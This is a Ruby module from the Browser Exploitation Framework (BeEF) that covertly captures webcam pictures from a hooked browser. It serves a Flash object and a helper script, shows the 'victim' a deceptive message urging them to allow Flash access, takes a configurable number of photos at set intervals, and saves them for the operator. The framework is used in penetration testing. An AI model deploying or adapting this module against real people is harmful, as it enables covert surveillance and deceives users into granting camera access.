#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
require 'base64'
class Webcam < BeEF::Core::Command
  def pre_send
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/browser/webcam/takeit.swf', '/takeit', 'swf')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/browser/webcam/swfobject.js', '/swfobject', 'js')
  end
  def self.options
       configuration = BeEF::Core::Configuration.instance
       social_engineering_title = "This website is using Adobe Flash"
       social_engineering_text = "In order to work with the programming framework this website is using, you need to allow the Adobe Flash Player Settings. If you use the new Ajax and HTML5 features in conjunction with Adobe Flash Player, it will increase your user experience."
       no_of_pictures = 20
       interval = 1000
       return [
           {'name' => 'social_engineering_title', 
            'description' => 'The title that is shown to the victim.',
            'ui_label' => 'Social Engineering Title',
            'value' => social_engineering_title,
            'width' => '100px' }, {
            'name' => 'social_engineering_text', 
           'description' => 'The social engineering text you want to show to convince the user to click the Allow button.',
           'ui_label' => 'Social Engineering Text',
           'value' => social_engineering_text,
           'width' => '300px',
           'type' => 'textarea' }, {
           'name' => 'no_of_pictures', 
           'description' => 'The number of pictures you want to take after the victim clicked "allow".',
           'ui_label' => 'Number of pictures',
           'value' => no_of_pictures,
           'width' => '100px' }, {
            'name' => 'interval', 
            'description' => 'The interval in which pictures are taken.',
            'ui_label' => 'Interval to take pictures (ms)',
            'value' => interval,
            'width' => '100px' }
           ]
  end
  
  
	def post_execute 
		content = {}
		content["result"] = @datastore["result"] if not @datastore["result"].nil?
		content["picture"] = @datastore["picture"] if not @datastore["picture"].nil?
		save content
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/takeit.swf')
		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/swfobject.js')
	end

end
